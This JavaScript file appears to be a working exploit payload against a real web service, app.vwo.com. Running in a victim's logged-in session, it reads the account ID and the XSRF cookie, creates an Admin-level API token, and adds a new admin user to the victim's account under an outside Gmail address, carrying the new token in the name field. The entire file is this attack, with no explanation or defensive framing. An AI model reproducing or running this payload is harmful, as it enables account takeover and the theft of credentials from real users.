var loginRequest = new XMLHttpRequest();

loginRequest.open('GET', 'https://app.vwo.com/login', true);
loginRequest.withCredentials = true;

loginRequest.onload = function() {
    var loginResponse = JSON.parse(loginRequest.responseText);
    var accountId = loginResponse.accountId;
    requestAuthToken(accountId);
};

loginRequest.send();

function requestAuthToken(accountId) {
    var authTokenRequest = new XMLHttpRequest();
    var authTokenUrl = 'https://app.vwo.com/developers/tokens?accountId=' + accountId;
    authTokenRequest.open('POST', authTokenUrl, true);
    authTokenRequest.setRequestHeader('Content-Type', 'application/json');

    authTokenRequest.onload = function() {
        var authTokenResponse = JSON.parse(authTokenRequest.responseText);
        var authToken = authTokenResponse.authToken;
        var xsrfToken = getCookieValue('XSRF-TOKEN');
        if (xsrfToken) {
            sendMultiAccountRequest(accountId, authToken, xsrfToken);
        }
    };

    var authTokenRequestBody = JSON.stringify({
        "applicationName": "test",
        "policy": {
            "name": "Admin"
        }
    });

    authTokenRequest.send(authTokenRequestBody);
}

function sendMultiAccountRequest(accountId, authToken, xsrfToken) {
    var multiAccountRequest = new XMLHttpRequest();
    var multiAccountUrl = 'https://app.vwo.com/user/multi-account?accountId=' + accountId;
    multiAccountRequest.open('POST', multiAccountUrl, true);
    multiAccountRequest.setRequestHeader('Content-Type', 'application/json;charset=utf-8');
    multiAccountRequest.setRequestHeader('X-Xsrf-Token', xsrfToken);

    multiAccountRequest.onload = function() {};

    var randomString = Math.random().toString(36).substring(7);
    var multiAccountRequestBody = JSON.stringify({
        "name": authToken,
        "email": "tt276274+" + randomString + "@gmail.com",
        "disableSSO": true,
        "accountInfo": [
            {
                "accountId": accountId,
                "permission": "Admin"
            }
        ]
    });

    multiAccountRequest.send(multiAccountRequestBody);
}

function getCookieValue(cookieName) {
    var cookieString = "; " + document.cookie;
    var cookieParts = cookieString.split("; " + cookieName + "=");
    if (cookieParts.length === 2) return cookieParts.pop().split(";").shift();
}
